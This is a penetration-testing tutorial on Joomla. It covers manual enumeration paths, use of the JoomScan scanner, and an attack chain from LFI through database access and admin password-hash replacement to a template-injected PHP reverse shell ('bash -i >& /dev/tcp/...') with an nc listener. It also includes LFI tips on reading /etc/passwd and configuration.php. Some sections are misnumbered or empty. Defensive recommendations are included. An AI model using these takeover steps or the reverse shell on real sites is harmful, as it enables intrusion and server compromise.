## Joomla Enumeration

Joomla Enumeration is the process of extracting useful information from a website during reconnaissance or penetration testing.

---

## Objectives

Identify:

- Joomla version
- Installed components, modules, plugins
- Admin panel access points
- Valid usernames
- Sensitive files / misconfigurations

---

## Why Enumeration Matters

| Area | Impact |
| --- | --- |
| Version Detection | Map to known CVEs |
| Extensions Discovery | Third-party vulnerabilities |
| User Enumeration | Brute-force / credential stuffing |
| Misconfigurations | Direct exploitation paths |

## Manual Enumeration Techniques

### 1. Admin Panel Discovery

Default Joomla admin panel:

```
/administrator/
```

Example:

```
http://192.168.1.206/administrator/
```

Look for:

- Login panel
- Error messages (version leakage)

---

### 2. Source Code Inspection

Check page source:

```
<meta name="generator" content="Joomla! - Open Source Content Management" />
```

Sometimes includes exact version.

---

### 3. Common Sensitive Paths

```
/README.txt
/robots.txt
/administrator/
/components/
/modules/
/plugins/
/templates/
/language/
/tmp/
/logs/
```

---

### 4. robots.txt Analysis

```
http://target/robots.txt
```

Often reveals:

- Hidden directories
- Admin paths

---

### 5. User Enumeration (Advanced)

Method 1: Registration Endpoint

```
http://target/index.php?option=com_users&view=registration
```

Method 2: Error-Based Enumeration

Look for:

- Login errors (e.g., "Invalid username")
- JSON responses
- Debug output

---

### 6. Version Detection Techniques

Check:

```
/language/en-GB/en-GB.xml

/administrator/manifests/files/joomla.xml
```

- HTTP headers
- RSS feeds

```
/index.php?format=feed
```

Example:

```
http://192.168.1.206/index.php?format=feed
```

---

### 7. Extension Enumeration (Manual)

Try accessing:

```
/components/com_*

/modules/mod_*

/plugins/*
```

Example:

```
/components/com_content/

/components/com_users/
```

### 2. Configuration File Exposure


### 3. Template Enumeration

```
/templates/<template_name>/
```

Check:

- JavaScript files
- Configuration leaks
- Hardcoded credentials

---

### 4. API and AJAX Endpoints

```
/index.php?option=com_ajax
```

May expose:

- Unauthenticated actions
- Data leaks

---

### 5. Misconfigured Debug Mode

Look for:

- Full paths revealed
- SQL errors
- Stack traces

---

## Mitigation (For Defenders)

- Remove generator meta tag
- Restrict **/administrator/** access (IP allowlist or MFA)
- Keep Joomla and extensions updated
- Disable directory listing
- Secure **configuration.php**
- Use security extensions
- Enable Web Application Firewall (WAF)

## Joomla Enumeration with JoomScan

## JoomScan Usage Overview

JoomScan is a Perl-based vulnerability scanner designed for Joomla.

---

## Installation

```
apt install joomscan
```

Clone the tool from GitHub:

```
git clone https://github.com/OWASP/joomscan.git
```

Navigate into the directory:

```
cd joomscan
```

---

## Basic Usage

Display help options:

```
perl joomscan.pl -h

joomscan.pl -h
```

Update vulnerability database:

```
perl joomscan.pl --update
```

Run a scan:

```
perl joomscan.pl -u http://192.168.1.220/
```

---

## What the Scan Performs

- Joomla version detection
- Admin panel discovery
- Component/module/plugin enumeration
- Known vulnerability identification

## 🧾 5. Joomla Admin Account Takeover

### Steps:

**1. Select DB:**

```
joomla_db
```

**2. Open users table:**

```
armo_users
```

**3. Locate:**

```
username = admin
```

**4. Replace password with bcrypt hash**

Example hash for **admin:**

```
$2y$10$vl8aWBNw3fID.ZQ4/zo1GehHMbFYYJ9rjH8Z3omFE6E7K7e/fLz4a
```

⚠️ Joomla uses **bcrypt**, so direct hash replacement works.

## 💣 7. Remote Code Execution (RCE)

### Navigate to:

```
Extensions → Templates → Templates
```

Edit template *(example: beez3)*:

```
index.php
```

### Inject Reverse Shell

```
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.7/443 0>&1'");
?>
```

### Start listener:

```
nc -lvnp 443
```

🎯 You now get a **reverse shell** as the web server user.

## 🔥 Attack Chain Summary

```
JoomScan → LFI → configuration.php → DB creds →
phpMyAdmin → Admin hash replace → Joomla login →
Template edit → Reverse shell → RCE
```

---

## 🛡️ Security Recommendations (Important for Reports)

❌ Disable direct access to:

```
/phpmyadmin/
```

❌ Avoid using **root DB credentials** in web apps

❌ Patch/remove vulnerable component:

```
com_hdflvplayer
```

❌ Restrict file access *(fix LFI)*

❌ Enforce strong password hashing + salting *(already bcrypt but exposed)*

❌ Disable template editing in Joomla admin

✅ Use Web Application Firewall (WAF)

✅ Principle of Least Privilege *(DB user)*

---

## 💡 Pro Tips (Real Pentest Insight)

**LFI can also be used for:**

```
/etc/passwd

Apache logs → Log poisoning → RCE
```

**Always check:**

```
/var/www/html/configuration.php
```

If phpMyAdmin wasn't exposed you could:

```
Dump DB via LFI + log tricks

Or brute admin via RCE/LFI
```
